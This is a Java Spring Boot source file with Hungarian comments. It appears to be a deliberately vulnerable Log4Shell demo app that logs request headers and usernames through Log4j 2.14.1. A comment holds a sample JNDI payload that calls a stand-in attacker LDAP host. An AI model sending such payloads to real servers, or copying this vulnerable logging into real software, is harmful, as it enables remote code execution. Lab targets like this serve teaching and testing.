package com.demo;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.web.bind.annotation.*;

import javax.servlet.http.HttpServletRequest;

/**
 * Log4Shell démó – Sebezhető Spring Boot alkalmazás
 *
 * SÉRÜLÉKENYSÉG: A Log4j 2.x automatikusan feloldja a ${jndi:...}
 * kifejezéseket a naplózott stringekben.
 *
 * Ha a User-Agent tartalmaz: ${jndi:ldap://attacker:1389/x}
 * → Log4j elvégzi az LDAP lookupot → letölti és futtatja a Java class-t
 */
@SpringBootApplication
@RestController
public class VulnerableApplication {

    // !!!! SÉRÜLÉKENY: Log4j 2.14.1 !!!!
    private static final Logger logger = LogManager.getLogger(VulnerableApplication.class);

    public static void main(String[] args) {
        SpringApplication.run(VulnerableApplication.class, args);
    }

    /**
     * Főendpoint – naplózza a User-Agent fejlécet (SÉRÜLÉKENY!)
     * A Log4j feldolgozza a ${jndi:...} kifejezéseket a logüzenetben.
     */
    @GetMapping("/api/hello")
    public String hello(HttpServletRequest request) {
        String userAgent = request.getHeader("User-Agent");
        String xForwardedFor = request.getHeader("X-Forwarded-For");
        String xApiVersion = request.getHeader("X-Api-Version");

        // *** SÉRÜLÉKENY LOG HÍVÁSOK ***
        // A Log4j itt feldolgozza a JNDI lookupot a stringben!
        logger.info("Kérés érkezett. User-Agent: {}", userAgent);

        if (xForwardedFor != null) {
            logger.info("X-Forwarded-For: {}", xForwardedFor);
        }
        if (xApiVersion != null) {
            logger.info("X-Api-Version: {}", xApiVersion);
        }

        return "Hello! A kérés naplózva. (User-Agent: " + userAgent + ")";
    }

    /**
     * Állapot endpoint
     */
    @GetMapping("/api/status")
    public String status() {
        logger.info("Státusz lekérdezés");
        return "{\"status\": \"running\", \"app\": \"vulnerable-log4j-demo\"}";
    }

    /**
     * Bemutató endpoint – szimulál egy bejelentkezést
     */
    @PostMapping("/api/login")
    public String login(@RequestParam String username, HttpServletRequest request) {
        String userAgent = request.getHeader("User-Agent");

        // SÉRÜLÉKENY: username is naplózva van!
        logger.info("Bejelentkezési kísérlet. Felhasználó: {}, User-Agent: {}", username, userAgent);

        return "{\"message\": \"Login attempt logged for: " + username + "\"}";
    }
}
